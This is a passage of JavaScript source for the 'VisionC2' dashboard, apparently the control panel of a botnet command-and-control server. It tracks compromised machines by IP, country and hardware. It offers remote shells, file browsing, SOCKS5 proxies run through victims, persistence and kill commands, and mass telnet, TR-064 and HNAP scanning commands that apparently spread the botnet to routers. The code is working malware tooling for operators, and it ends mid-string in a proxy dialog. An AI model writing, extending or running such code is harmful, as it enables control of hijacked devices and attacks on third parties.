/* ============================================================================
   VisionC2 Dashboard Application
   Vanilla JS — SSE with polling fallback, diff-based table updates,
   filter panel, multi-select, enhanced shell modal with file browser,
   breadcrumb nav, tab completion, split shell, bot info sidebar.
   ============================================================================ */

// ---------------------------------------------------------------------------
// Utility helpers
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// localStorage persistence helpers
// ---------------------------------------------------------------------------

var LS_PREFIX = 'vision_';
function lsSet(key, val) { try { localStorage.setItem(LS_PREFIX + key, JSON.stringify(val)); } catch (e) { } }
function lsGet(key, def) { try { var v = localStorage.getItem(LS_PREFIX + key); return v !== null ? JSON.parse(v) : def; } catch (e) { return def; } }
function lsDel(key) { try { localStorage.removeItem(LS_PREFIX + key); } catch (e) { } }

function formatRAM(mb) {
  return mb >= 1024 ? (mb / 1024).toFixed(1) + 'GB' : mb + 'MB';
}

function formatUplink(mbps) {
  if (!mbps || mbps <= 0) return '<span style="opacity:0.4">-</span>';
  if (mbps >= 1000) return '<span style="color:#58a6ff">' + (mbps / 1000).toFixed(1) + ' Gbps</span>';
  return '<span style="color:#58a6ff">' + mbps.toFixed(1) + ' Mbps</span>';
}

function ago(iso) {
  var d = new Date(iso), s = Math.max(0, Math.floor((Date.now() - d) / 1000));
  if (s < 5) return 'just now';
  if (s < 60) return s + 's ago';
  if (s < 3600) return Math.floor(s / 60) + 'm ago';
  if (s < 86400) return Math.floor(s / 3600) + 'h ago';
  return Math.floor(s / 86400) + 'd ago';
}

function botHealth(lastPing) {
  var s = Math.floor((Date.now() - new Date(lastPing)) / 1000);
  if (s < 30) return { cls: 'health-ok', dot: 'health-dot-ok', row: 'health-ok-row' };
  if (s < 60) return { cls: 'health-warn', dot: 'health-dot-warn', row: 'health-warn-row' };
  if (s < 120) return { cls: 'health-stale', dot: 'health-dot-stale', row: 'health-stale-row' };
  return { cls: 'health-dead', dot: 'health-dot-dead', row: 'health-dead-row' };
}

function escHtml(s) {
  var d = document.createElement('div');
  d.textContent = s;
  return d.innerHTML;
}

function showToast(msg, ok) {
  var t = document.getElementById('toast');
  t.textContent = msg;
  t.className = 'toast ' + (ok ? 'ok' : 'err');
  setTimeout(function () { t.className = 'toast'; }, 3000);
  var now = new Date();
  var ts = ('0' + now.getHours()).slice(-2) + ':' + ('0' + now.getMinutes()).slice(-2) + ':' + ('0' + now.getSeconds()).slice(-2);
  addNotification(ts, (ok ? 'OK' : 'ERR') + ': ' + msg);
}

function sanitizeId(id) {
  return id.replace(/[^a-zA-Z0-9_-]/g, '_');
}

// Color-coded group tags — deterministic color from group name
var groupColors = [
  { bg: 'rgba(139, 92, 246, 0.12)', fg: '#a78bfa', border: 'rgba(139, 92, 246, 0.3)' },  // purple
  { bg: 'rgba(59, 130, 246, 0.12)', fg: '#60a5fa', border: 'rgba(59, 130, 246, 0.3)' },   // blue
  { bg: 'rgba(34, 197, 94, 0.12)', fg: '#4ade80', border: 'rgba(34, 197, 94, 0.3)' },    // green
  { bg: 'rgba(234, 179, 8, 0.12)', fg: '#facc15', border: 'rgba(234, 179, 8, 0.3)' },    // yellow
  { bg: 'rgba(6, 182, 212, 0.12)', fg: '#22d3ee', border: 'rgba(6, 182, 212, 0.3)' },    // cyan
  { bg: 'rgba(239, 68, 68, 0.12)', fg: '#f87171', border: 'rgba(239, 68, 68, 0.3)' },    // red
  { bg: 'rgba(249, 115, 22, 0.12)', fg: '#fb923c', border: 'rgba(249, 115, 22, 0.3)' },   // orange
  { bg: 'rgba(168, 85, 247, 0.12)', fg: '#c084fc', border: 'rgba(168, 85, 247, 0.3)' },   // violet
  { bg: 'rgba(236, 72, 153, 0.12)', fg: '#f472b6', border: 'rgba(236, 72, 153, 0.3)' },   // pink
  { bg: 'rgba(20, 184, 166, 0.12)', fg: '#2dd4bf', border: 'rgba(20, 184, 166, 0.3)' },   // teal
];

function groupColorIndex(name) {
  var hash = 0;
  for (var i = 0; i < name.length; i++) { hash = ((hash << 5) - hash) + name.charCodeAt(i); hash |= 0; }
  return Math.abs(hash) % groupColors.length;
}

function groupTagHtml(group) {
  if (!group) return '<span class="group-tag group-none">-</span>';
  var c = groupColors[groupColorIndex(group)];
  return '<span class="group-tag" style="background:' + c.bg + ';color:' + c.fg + ';border:1px solid ' + c.border + '">' + escHtml(group) + '</span>';
}

// ---------------------------------------------------------------------------
// SSE (Server-Sent Events)
// ---------------------------------------------------------------------------

var evtSource = null;
var sseRetryDelay = 1000;
var sseFails = 0;
var sseActive = false;
var pollingActive = false;

function connectSSE() {
  if (evtSource) evtSource.close();
  evtSource = new EventSource('/api/events');

  evtSource.onopen = function () {
    sseRetryDelay = 1000; sseFails = 0; sseActive = true;
    updateSSEIndicator(true);
  };

  evtSource.addEventListener('stats', function (e) { updateStats(JSON.parse(e.data)); });
  evtSource.addEventListener('bots', function (e) { updateBots(JSON.parse(e.data)); });
  evtSource.addEventListener('activity', function (e) { addActivityEntry(JSON.parse(e.data)); });
  evtSource.addEventListener('bot_connect', function (e) {
    var bot = JSON.parse(e.data);
    addOrUpdateBot(bot);
    addNotification('connect', bot.botID + ' connected');
  });
  evtSource.addEventListener('bot_disconnect', function (e) {
    var d = JSON.parse(e.data);
    removeBot(d.botID);
    addNotification('disconnect', d.botID + ' disconnected');
  });
  evtSource.addEventListener('socks_update', function (e) { updateBotSocks(JSON.parse(e.data)); });

  evtSource.onerror = function () {
    updateSSEIndicator(false); sseActive = false; evtSource.close(); sseFails++;
    if (sseFails > 3 && !pollingActive) { startPolling(); }
    else { setTimeout(connectSSE, sseRetryDelay); sseRetryDelay = Math.min(sseRetryDelay * 2, 30000); }
  };
}

function updateSSEIndicator(connected) {
  var el = document.getElementById('sse-dot');
  if (el) { el.className = 'sse-indicator ' + (connected ? 'sse-connected' : 'sse-disconnected'); el.title = connected ? 'Live connection' : 'Reconnecting...'; }
}

function startPolling() {
  if (pollingActive) return;
  pollingActive = true;
  setInterval(function () {
    fetch('/api/stats').then(function (r) { return r.json(); }).then(updateStats).catch(function () { });
    fetch('/api/bots').then(function (r) { return r.json(); }).then(updateBots).catch(function () { });
    fetch('/api/activity').then(function (r) { return r.json(); }).then(function (entries) { renderActivityFull(entries); }).catch(function () { });
    loadRelayStats();
  }, 5000);
}

// ---------------------------------------------------------------------------
// Stats
// ---------------------------------------------------------------------------

var prevBots = -1, prevRAM = -1, prevCPU = -1;

function updateStats(d) {
  document.getElementById('s-bots').textContent = d.botCount;
  document.getElementById('s-ram').textContent = formatRAM(d.totalRAM);
  document.getElementById('s-cpu').textContent = d.totalCPU + ' cores';
  document.getElementById('s-uptime').textContent = d.uptime;

  var ah = document.getElementById('s-arch');
  ah.innerHTML = '';
  if (d.archMap) {
    Object.entries(d.archMap).forEach(function (e) {
      var s = document.createElement('span'); s.className = 'arch-pill'; s.textContent = e[0] + ': ' + e[1]; ah.appendChild(s);
    });
  }

  setDelta('s-bots-delta', d.botCount, prevBots); prevBots = d.botCount;
  setDelta('s-ram-delta', d.totalRAM, prevRAM); prevRAM = d.totalRAM;
  setDelta('s-cpu-delta', d.totalCPU, prevCPU); prevCPU = d.totalCPU;

  if (d.history && d.history.length > 1) {
    drawSparkline('spark-bots', d.history.map(function (h) { return h.botCount; }));
    drawSparkline('spark-ram', d.history.map(function (h) { return h.totalRAM; }));
    drawSparkline('spark-cpu', d.history.map(function (h) { return h.totalCPU; }));
    var bots = d.history.map(function (h) { return h.botCount; });
    var mn = Math.min.apply(null, bots), mx = Math.max.apply(null, bots);
    document.getElementById('s-bots-range').textContent = 'range: ' + mn + ' \u2013 ' + mx + ' (' + d.history.length + ' samples)';
  }
}

function setDelta(id, cur, prev) {
  var el = document.getElementById(id);
  if (!el || prev < 0) return;
  var diff = cur - prev;
  if (diff > 0) { el.textContent = '+' + diff; el.className = 'stat-delta up'; }
  else if (diff < 0) { el.textContent = '' + diff; el.className = 'stat-delta down'; }
  else { el.textContent = ''; el.className = 'stat-delta flat'; }
}

function drawSparkline(id, vals) {
  var svg = document.getElementById(id);
  if (!svg || !vals.length) return;
  var mn = Math.min.apply(null, vals), mx = Math.max.apply(null, vals);
  var range = mx - mn || 1;
  var w = 120, h = 32, pad = 2;
  var pts = [];
  for (var i = 0; i < vals.length; i++) {
    var x = (i / (vals.length - 1)) * w;
    var y = pad + (h - 2 * pad) * (1 - (vals[i] - mn) / range);
    pts.push(x.toFixed(1) + ',' + y.toFixed(1));
  }
  var line = pts.join(' ');
  var fill = pts[0].split(',')[0] + ',' + h + ' ' + line + ' ' + pts[pts.length - 1].split(',')[0] + ',' + h;
  svg.innerHTML = '<polygon class="spark-fill" points="' + fill + '"/><polyline points="' + line + '"/>';
}

// ---------------------------------------------------------------------------
// Diff-based bot table updates
// ---------------------------------------------------------------------------

var botState = {};
var botOrder = [];
var selectedBots = {};

function updateBots(bots) {
  var newState = {};
  bots.forEach(function (b) { newState[b.botID] = b; });

  botOrder.forEach(function (id) {
    if (!newState[id]) {
      var row = document.getElementById('bot-' + sanitizeId(id));
      if (row) row.remove();
      delete selectedBots[id];
    }
  });

  var tbody = document.getElementById('bot-tbody');
  botOrder = bots.map(function (b) { return b.botID; });

  bots.forEach(function (b) {
    var existing = botState[b.botID];
    var rowId = 'bot-' + sanitizeId(b.botID);
    var row = document.getElementById(rowId);
    if (!row) { row = createBotRow(b); tbody.appendChild(row); }
    else if (botChanged(existing, b)) { updateBotRow(row, b); }
  });

  botState = newState;
  window._bots = newState;
  window._botsArr = bots;
  updateBotCount();
  renderSocksDash();
  buildFilterPanel();
  filterBotTable();
  updateGroupStats();
}

function addOrUpdateBot(b) {
  botState[b.botID] = b;
  if (botOrder.indexOf(b.botID) === -1) botOrder.push(b.botID);
  var rowId = 'bot-' + sanitizeId(b.botID);
  var row = document.getElementById(rowId);
  var tbody = document.getElementById('bot-tbody');
  if (!row) { row = createBotRow(b); tbody.appendChild(row); }
  else { updateBotRow(row, b); }
  window._bots = botState;
  updateBotCount();
  buildFilterPanel();
  filterBotTable();
  updateGroupStats();
}

function removeBot(botID) {
  delete botState[botID]; delete selectedBots[botID];
  botOrder = botOrder.filter(function (id) { return id !== botID; });
  var row = document.getElementById('bot-' + sanitizeId(botID));
  if (row) row.remove();
  window._bots = botState;
  updateBotCount(); renderSocksDash(); updateMultiSelectBar(); updateGroupStats();
}

function updateBotSocks(d) {
  if (!d || !d.botID) return;
  var b = botState[d.botID]; if (!b) return;
  b.socksActive = d.socksActive; b.socksRelay = d.socksRelay || '';
  b.socksUser = d.socksUser || ''; b.socksStarted = d.socksStarted || '';
  botState[d.botID] = b; window._bots = botState;
  var row = document.getElementById('bot-' + sanitizeId(d.botID));
  if (row) updateBotRow(row, b);
  renderSocksDash();
}

function botChanged(a, b) {
  if (!a) return true;
  return a.socksActive !== b.socksActive || a.socksRelay !== b.socksRelay ||
    a.uptime !== b.uptime || a.lastPing !== b.lastPing ||
    a.ram !== b.ram || a.cpuCores !== b.cpuCores || a.group !== b.group;
}

function updateBotCount() {
  var count = botOrder.length;
  var el = document.getElementById('tab-bots-count');
  if (el) el.textContent = count;
  if (count === 0) {
    var tbody = document.getElementById('bot-tbody');
    if (!tbody.querySelector('tr')) {
      tbody.innerHTML = '<tr><td colspan="13" class="no-bots">No bots connected</td></tr>';
    }
  }
}

function createBotRow(b) {
  var tr = document.createElement('tr');
  tr.className = 'bot-row';
  tr.id = 'bot-' + sanitizeId(b.botID);
  tr.setAttribute('data-botid', b.botID);
  tr.oncontextmenu = function (ev) { ev.preventDefault(); if (ev.target.type === 'checkbox') return; pinBotPopup(ev, b.botID); };
  tr.ondblclick = function (ev) { if (ev.target.type === 'checkbox') return; openShell(b.botID); };

  var socksHtml = b.socksActive
    ? '<span class="socks-badge socks-on"><span class="socks-dot"></span>ON</span>'
    : '<span class="socks-badge socks-off"><span class="socks-dot"></span>OFF</span>';
  var checked = selectedBots[b.botID] ? ' checked' : '';

  var h = botHealth(b.lastPing);
  tr.className = 'bot-row ' + h.row;

  var eid = b.botID.replace(/'/g, "\\'");
  tr.innerHTML =
    '<td><input type="checkbox"' + checked + ' onchange="toggleBotSelect(\'' + eid + '\',this.checked)"></td>' +
    '<td><span class="bot-id-link" onclick="event.stopPropagation();targetBot(\'' + eid + '\')" title="Click to target this bot">' + escHtml(b.botID) + '</span></td>' +
    '<td style="font-family:monospace">' + escHtml(b.ip) + '</td>' +
    '<td><span class="country-badge">' + escHtml(b.country) + '</span></td>' +
    '<td>' + groupTagHtml(b.group) + '</td>' +
    '<td>' + escHtml(b.arch) + '</td>' +
    '<td>' + formatRAM(b.ram) + '</td>' +
    '<td>' + b.cpuCores + '</td>' +
    '<td>' + formatUplink(b.uplinkMbps) + '</td>' +
    '<td>' + escHtml(b.processName) + '</td>' +
    '<td>' + socksHtml + '</td>' +
    '<td>' + escHtml(b.uptime) + '</td>' +
    '<td class="' + h.cls + '"><span class="health-dot ' + h.dot + '"></span>' + ago(b.lastPing) + '</td>';
  return tr;
}

function updateBotRow(row, b) {
  var cells = row.getElementsByTagName('td');
  if (cells.length < 13) return;
  var socksHtml = b.socksActive
    ? '<span class="socks-badge socks-on"><span class="socks-dot"></span>ON</span>'
    : '<span class="socks-badge socks-off"><span class="socks-dot"></span>OFF</span>';
  cells[4].innerHTML = groupTagHtml(b.group);
  cells[6].textContent = formatRAM(b.ram);
  cells[7].textContent = b.cpuCores;
  cells[8].innerHTML = formatUplink(b.uplinkMbps);
  cells[9].textContent = b.processName;
  cells[10].innerHTML = socksHtml;
  cells[11].textContent = b.uptime;
  var h = botHealth(b.lastPing);
  cells[12].className = h.cls;
  cells[12].innerHTML = '<span class="health-dot ' + h.dot + '"></span>' + ago(b.lastPing);
  row.className = 'bot-row ' + h.row;
  row.oncontextmenu = function (ev) { ev.preventDefault(); if (ev.target.type === 'checkbox') return; pinBotPopup(ev, b.botID); };
  row.ondblclick = function (ev) { if (ev.target.type === 'checkbox') return; openShell(b.botID); };
}

// ---------------------------------------------------------------------------
// Multi-select
// ---------------------------------------------------------------------------

function toggleBotSelect(botID, checked) {
  if (checked) selectedBots[botID] = true;
  else delete selectedBots[botID];
  updateMultiSelectBar();
}

function toggleSelectAll(checked) {
  var rows = document.querySelectorAll('#bot-tbody tr.bot-row');
  rows.forEach(function (r) {
    if (r.style.display === 'none') return;
    var cb = r.querySelector('input[type=checkbox]');
    var id = r.getAttribute('data-botid');
    if (cb) { cb.checked = checked; }
    if (checked) selectedBots[id] = true;
    else delete selectedBots[id];
  });
  updateMultiSelectBar();
}

function updateMultiSelectBar() {
  var count = Object.keys(selectedBots).length;
  var bar = document.getElementById('multi-select-bar');
  bar.style.display = count > 0 ? 'flex' : 'none';
  document.getElementById('ms-count').textContent = count + ' selected';
}

function msCmd(cmd) {
  var ids = Object.keys(selectedBots);
  if (!ids.length) return;
  ids.forEach(function (id) { popupCmd(id, cmd); });
  showToast('Sent ' + cmd + ' to ' + ids.length + ' bots', true);
}

function msScan() {
  var ids = Object.keys(selectedBots);
  if (!ids.length) return;
  var addr = prompt('Scan server address (host:port):', '');
  if (!addr || !addr.trim()) return;
  ids.forEach(function (id) { popupCmd(id, '!scan ' + addr.trim()); });
  showToast('Sent !scan to ' + ids.length + ' bots', true);
}

// ---------------------------------------------------------------------------
// Scanner Tab — global start/stop
// ---------------------------------------------------------------------------
function scannerStart(type) {
  var cmd;
  if (type === 'telnet') {
    var addr = document.getElementById('scan-telnet-addr').value.trim();
    if (!addr) { showToast('Enter a scan server address', false); return; }
    cmd = '!scan ' + addr;
  } else if (type === 'tr064') {
    cmd = '!tr064';
  } else if (type === 'hnap') {
    cmd = '!hnap';
  } else { return; }
  fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: cmd }) })
    .then(function (r) { return r.json(); }).then(function (d) { showToast(d.message, d.success); })
    .catch(function () { showToast('Request failed', false); });
}

function scannerStop(type) {
  var cmd;
  if (type === 'telnet') { cmd = '!stopscan'; }
  else if (type === 'tr064') { cmd = '!stoptr064'; }
  else if (type === 'hnap') { cmd = '!stophnap'; }
  else { return; }
  fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: cmd }) })
    .then(function (r) { return r.json(); }).then(function (d) { showToast(d.message, d.success); })
    .catch(function () { showToast('Request failed', false); });
}

function msKill() {
  var ids = Object.keys(selectedBots);
  if (!ids.length) return;
  if (!confirm('Kill ' + ids.length + ' bots? This cannot be undone.')) return;
  ids.forEach(function (id) { popupCmd(id, '!kill'); });
  selectedBots = {};
  updateMultiSelectBar();
}

function msOpenShells() {
  var ids = Object.keys(selectedBots);
  if (!ids.length) return;
  // Open first shell, add others as tabs
  openShell(ids[0]);
  for (var i = 1; i < ids.length && i < 8; i++) {
    addShellTab(ids[i]);
  }
}

// ---------------------------------------------------------------------------
// Group Assignment
// ---------------------------------------------------------------------------

function showGroupPicker(botIDs, anchorEl) {
  // Remove existing picker
  var old = document.getElementById('group-picker-overlay');
  if (old) old.remove();

  // Fetch existing groups for autocomplete
  fetch('/api/groups').then(function (r) { return r.json(); }).then(function (groups) {
    var opts = (groups || []).map(function (g) {
      return '<option value="' + escHtml(g) + '">' + escHtml(g) + '</option>';
    }).join('');

    var d = document.createElement('div');
    d.id = 'group-picker-overlay';
    d.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:9999;display:flex;align-items:center;justify-content:center';
    d.innerHTML = '<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:8px;padding:20px;min-width:340px">' +
      '<div style="font-size:14px;font-weight:600;margin-bottom:12px;color:var(--text)">Set Group for ' + botIDs.length + ' bot' + (botIDs.length > 1 ? 's' : '') + '</div>' +
      '<div style="margin-bottom:12px">' +
      '<input type="text" id="group-pick-input" list="group-pick-list" placeholder="Type group name or select..." style="width:100%;padding:8px;background:var(--bg-primary);border:1px solid var(--border);color:var(--text);border-radius:4px;font-size:13px">' +
      '<datalist id="group-pick-list">' + opts + '</datalist>' +
      '</div>' +
      '<div style="display:flex;gap:8px;justify-content:flex-end">' +
      '<button id="group-pick-remove" style="padding:6px 16px;background:var(--red-dim);border:1px solid var(--red);color:var(--red);border-radius:4px;cursor:pointer;font-size:12px;font-weight:600">Remove Group</button>' +
      '<button id="group-pick-cancel" style="padding:6px 16px;background:var(--bg-elevated);border:1px solid var(--border);color:var(--text);border-radius:4px;cursor:pointer">Cancel</button>' +
      '<button id="group-pick-ok" style="padding:6px 16px;background:var(--accent);border:none;color:#fff;border-radius:4px;cursor:pointer;font-weight:600">Apply</button>' +
      '</div></div>';
    document.body.appendChild(d);
    d.addEventListener('click', function (e) { if (e.target === d) d.remove(); });
    document.getElementById('group-pick-cancel').onclick = function () { d.remove(); };
    document.getElementById('group-pick-ok').onclick = function () {
      var val = document.getElementById('group-pick-input').value.trim();
      if (!val) { return; }
      applyGroup(botIDs, val);
      d.remove();
    };
    document.getElementById('group-pick-remove').onclick = function () {
      applyGroup(botIDs, '');
      d.remove();
    };
    document.getElementById('group-pick-input').focus();
    document.getElementById('group-pick-input').addEventListener('keydown', function (e) {
      if (e.key === 'Enter') { document.getElementById('group-pick-ok').click(); }
      if (e.key === 'Escape') { d.remove(); }
    });
  }).catch(function () {
    var val = prompt('Enter group name (empty to remove):');
    if (val === null) return;
    applyGroup(botIDs, val.trim());
  });
}

function applyGroup(botIDs, group) {
  fetch('/api/group', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ botIDs: botIDs, group: group })
  })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      showToast(d.message, d.success);
      // Update local state immediately
      botIDs.forEach(function (id) {
        if (botState[id]) { botState[id].group = group; }
      });
      window._bots = botState;
      window._botsArr = botOrder.map(function (id) { return botState[id]; }).filter(Boolean);
      // Re-render affected rows
      botIDs.forEach(function (id) {
        var row = document.getElementById('bot-' + sanitizeId(id));
        if (row && botState[id]) updateBotRow(row, botState[id]);
      });
      lastFilterHash = '';
      buildFilterPanel();
      filterBotTable();
    })
    .catch(function () { showToast('Group request failed', false); });
}

function msSetGroup() {
  var ids = Object.keys(selectedBots);
  if (!ids.length) return;
  showGroupPicker(ids);
}

function popupSetGroup(botID) {
  showGroupPicker([botID]);
}

// ---------------------------------------------------------------------------
// Filter Panel
// ---------------------------------------------------------------------------

var activeFilters = { group: {}, arch: {}, country: {}, socks: {}, ram: {}, cpu: {} };
var lastFilterHash = '';

function buildFilterPanel() {
  if (!window._botsArr || !window._botsArr.length) return;
  var bots = window._botsArr;

  // Collect unique values
  var groups = {}, archs = {}, countries = {}, socks = { 'ON': 0, 'OFF': 0 };
  var ramRanges = { '< 1GB': 0, '1-4GB': 0, '4-16GB': 0, '16GB+': 0 };
  var cpuRanges = { '1 core': 0, '2-4 cores': 0, '4+ cores': 0 };

  bots.forEach(function (b) {
    var gk = b.group || '(ungrouped)';
    groups[gk] = (groups[gk] || 0) + 1;
    archs[b.arch] = (archs[b.arch] || 0) + 1;
    countries[b.country] = (countries[b.country] || 0) + 1;
    if (b.socksActive) socks['ON']++; else socks['OFF']++;
    if (b.ram < 1024) ramRanges['< 1GB']++;
    else if (b.ram < 4096) ramRanges['1-4GB']++;
    else if (b.ram < 16384) ramRanges['4-16GB']++;
    else ramRanges['16GB+']++;
    if (b.cpuCores <= 1) cpuRanges['1 core']++;
    else if (b.cpuCores <= 4) cpuRanges['2-4 cores']++;
    else cpuRanges['4+ cores']++;
  });

  var hash = JSON.stringify([groups, archs, countries, socks, ramRanges, cpuRanges]);
  if (hash === lastFilterHash) return;
  lastFilterHash = hash;

  var wrap = document.getElementById('filter-groups');
  wrap.innerHTML = '';

  function makeGroup(label, key, items) {
    var g = document.createElement('div'); g.className = 'filter-group';
    g.innerHTML = '<span class="filter-group-label">' + label + '</span>';
    var chips = document.createElement('div'); chips.className = 'filter-chips';
    Object.entries(items).forEach(function (e) {
      var val = e[0], cnt = e[1];
      var chip = document.createElement('label');
      chip.className = 'filter-chip' + (activeFilters[key][val] ? ' active' : '');
      chip.innerHTML = '<span class="filter-chip-dot"></span><input type="checkbox"' +
        (activeFilters[key][val] ? ' checked' : '') + '> ' + escHtml(val) + ' <span style="color:var(--text-dim)">(' + cnt + ')</span>';
      chip.onclick = function () {
        var cb = chip.querySelector('input');
        cb.checked = !cb.checked;
        if (cb.checked) { activeFilters[key][val] = true; chip.classList.add('active'); }
        else { delete activeFilters[key][val]; chip.classList.remove('active'); }
        filterBotTable();
      };
      chips.appendChild(chip);
    });
    g.appendChild(chips);
    wrap.appendChild(g);
  }

  if (Object.keys(groups).length > 1 || (Object.keys(groups).length === 1 && !groups['(ungrouped)'])) {
    makeGroup('Group', 'group', groups);
  }
  makeGroup('Arch', 'arch', archs);
  makeGroup('Country', 'country', countries);
  makeGroup('SOCKS', 'socks', socks);
  makeGroup('RAM', 'ram', ramRanges);
  makeGroup('CPU', 'cpu', cpuRanges);
}

function clearAllFilters() {
  activeFilters = { group: {}, arch: {}, country: {}, socks: {}, ram: {}, cpu: {} };
  document.getElementById('bot-search').value = '';
  lastFilterHash = '';
  lsDel('filters');
  lsDel('search');
  buildFilterPanel();
  filterBotTable();
}

function hasActiveFilters() {
  for (var k in activeFilters) {
    if (Object.keys(activeFilters[k]).length > 0) return true;
  }
  return false;
}

function botMatchesFilters(b) {
  if (Object.keys(activeFilters.group).length) {
    var gk = b.group || '(ungrouped)';
    if (!activeFilters.group[gk]) return false;
  }
  if (Object.keys(activeFilters.arch).length && !activeFilters.arch[b.arch]) return false;
  if (Object.keys(activeFilters.country).length && !activeFilters.country[b.country]) return false;
  if (Object.keys(activeFilters.socks).length) {
    var st = b.socksActive ? 'ON' : 'OFF';
    if (!activeFilters.socks[st]) return false;
  }
  if (Object.keys(activeFilters.ram).length) {
    var rk;
    if (b.ram < 1024) rk = '< 1GB';
    else if (b.ram < 4096) rk = '1-4GB';
    else if (b.ram < 16384) rk = '4-16GB';
    else rk = '16GB+';
    if (!activeFilters.ram[rk]) return false;
  }
  if (Object.keys(activeFilters.cpu).length) {
    var ck;
    if (b.cpuCores <= 1) ck = '1 core';
    else if (b.cpuCores <= 4) ck = '2-4 cores';
    else ck = '4+ cores';
    if (!activeFilters.cpu[ck]) return false;
  }
  return true;
}

// ---------------------------------------------------------------------------
// Bot search / filter (enhanced with filter panel)
// ---------------------------------------------------------------------------

function filterBotTable() {
  var q = (document.getElementById('bot-search').value || '').toLowerCase();
  lsSet('search', q);
  lsSet('filters', activeFilters);
  var rows = document.querySelectorAll('#bot-tbody tr.bot-row');
  var shown = 0, total = rows.length;
  var useFilters = hasActiveFilters();

  rows.forEach(function (r) {
    var id = r.getAttribute('data-botid');
    var b = botState[id];
    var textMatch = !q || r.textContent.toLowerCase().indexOf(q) !== -1;
    var filterMatch = !useFilters || (b && botMatchesFilters(b));
    if (textMatch && filterMatch) { r.style.display = ''; shown++; }
    else { r.style.display = 'none'; }
  });

  var sc = document.getElementById('search-count');
  if (q || useFilters) { sc.textContent = shown + '/' + total + ' shown'; }
  else { sc.textContent = ''; }
}

// ---------------------------------------------------------------------------
// Bot Info Popup
// ---------------------------------------------------------------------------

var popupPinned = false, popupBotID = '';

function fillPopup(b) {
  document.getElementById('popup-botid').textContent = b.botID;
  document.getElementById('popup-country').textContent = b.country;
  document.getElementById('popup-ip').textContent = b.ip;
  document.getElementById('popup-arch').textContent = b.arch;
  document.getElementById('popup-ram').textContent = formatRAM(b.ram);
  document.getElementById('popup-cpu').textContent = b.cpuCores + ' cores';
  document.getElementById('popup-uplink').innerHTML = formatUplink(b.uplinkMbps);
  document.getElementById('popup-proc').textContent = b.processName;
  document.getElementById('popup-uptime').textContent = b.uptime;
  document.getElementById('popup-ping').textContent = ago(b.lastPing);

  var ss = document.getElementById('popup-socks-status');
  if (b.socksActive) {
    ss.innerHTML = '<span class="popup-socks-active">ONLINE</span>';
    document.getElementById('popup-socks-relay-row').style.display = '';
    document.getElementById('popup-socks-relay').textContent = b.socksRelay || '-';
    document.getElementById('popup-socks-auth-row').style.display = b.socksUser ? '' : 'none';
    if (b.socksUser) document.getElementById('popup-socks-user').textContent = b.socksUser;
    document.getElementById('popup-socks-since-row').style.display = b.socksStarted ? '' : 'none';
    if (b.socksStarted) document.getElementById('popup-socks-since').textContent = ago(b.socksStarted);
  } else {
    ss.innerHTML = '<span class="popup-socks-inactive">OFFLINE</span>';
    document.getElementById('popup-socks-relay-row').style.display = 'none';
    document.getElementById('popup-socks-auth-row').style.display = 'none';
    document.getElementById('popup-socks-since-row').style.display = 'none';
  }

  var acts = document.getElementById('popup-actions');
  var id = b.botID.replace(/'/g, "\\'");
  var html = '<button class="popup-act act-group" onclick="popupSetGroup(\'' + id + '\')">' + (b.group ? 'Group: ' + escHtml(b.group) : 'Set Group') + '</button>';
  html += '<button class="popup-act act-shell" onclick="closeBotPopup();openShell(\'' + id + '\')">Shell</button>';
  if (b.socksActive) {
    html += '<button class="popup-act act-stopsocks" onclick="popupCmd(\'' + id + '\',\'!stopsocks\')">Stop SOCKS</button>';
  } else {
    html += '<button class="popup-act act-socks" onclick="popupStartSocks(\'' + id + '\')">Start SOCKS</button>';
  }
  html += '<button class="popup-act act-persist" onclick="popupCmd(\'' + id + '\',\'!persist\')">Persist</button>';
  html += '<button class="popup-act act-kill" onclick="popupKill(\'' + id + '\')">Kill</button>';
  acts.innerHTML = html;
}

function positionPopup(ev) {
  var p = document.getElementById('bot-popup');
  p.classList.add('visible');
  var pw = p.offsetWidth, ph = p.offsetHeight;
  var left = ev.clientX + 12, top = ev.clientY - ph / 2;
  if (left + pw > window.innerWidth) left = ev.clientX - pw - 12;
  if (top + ph > window.innerHeight) top = window.innerHeight - ph - 8;
  if (top < 8) top = 8;
  p.style.left = left + 'px'; p.style.top = top + 'px';
}

function pinBotPopup(ev, botID) {
  ev.stopPropagation();
  var b = window._bots && window._bots[botID]; if (!b) return;
  popupPinned = true; popupBotID = botID; fillPopup(b); positionPopup(ev);
}
function closeBotPopup() { popupPinned = false; popupBotID = ''; document.getElementById('bot-popup').classList.remove('visible'); }

document.addEventListener('click', function (e) {
  if (!popupPinned) return;
  var p = document.getElementById('bot-popup');
  if (!p.contains(e.target) && !e.target.closest('.bot-row')) { closeBotPopup(); }
});

// ---------------------------------------------------------------------------
// Popup commands
// ---------------------------------------------------------------------------

function popupCmd(botID, cmd) {
  fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: cmd, botID: botID }) })
    .then(function (r) { return r.json(); }).then(function (d) { showToast(d.message, d.success); })
    .catch(function () { showToast('Request failed', false); });
}

function popupKill(botID) {
  if (!confirm('Kill bot ' + botID + '? This cannot be undone.')) return;
  popupCmd(botID, '!kill'); closeBotPopup();
}

function popupStartScan(botID) {
  var addr = prompt('Scan server address (host:port):', '');
  if (!addr || !addr.trim()) return;
  popupCmd(botID, '!scan ' + addr.trim());
}

function popupStartSocks(botID) {
  // Remove existing modal if any
  var old = document.getElementById('socks-modal-overlay');
  if (old) old.remove();

  var defUser = typeof DEFAULT_PROXY_USER !== 'undefined' ? DEFAULT_PROXY_USER : 'admin';
  var defPass = typeof DEFAULT_PROXY_PASS !== 'undefined' ? DEFAULT_PROXY_PASS : 'admin';

  var overlay = document.createElement('div');
  overlay.id = 'socks-modal-overlay';
  overlay.className = 'socks-modal-overlay';
  overlay.innerHTML =
    '<div class="socks-modal">' +
    '<div class="socks-modal-title">Start SOCKS5 Proxy</div>' +
    '<div class="cmd-args">' +
    '<div class="cmd-group">' +
    '<label>Mode</label>' +
    '<select id="socks-m-mode" onchange="socksModalModeChange()">' +
    '<option value="direct">Direct (listen on bot)</option>' +
    '<option value="relay">Relay (backconnect)</option>' +
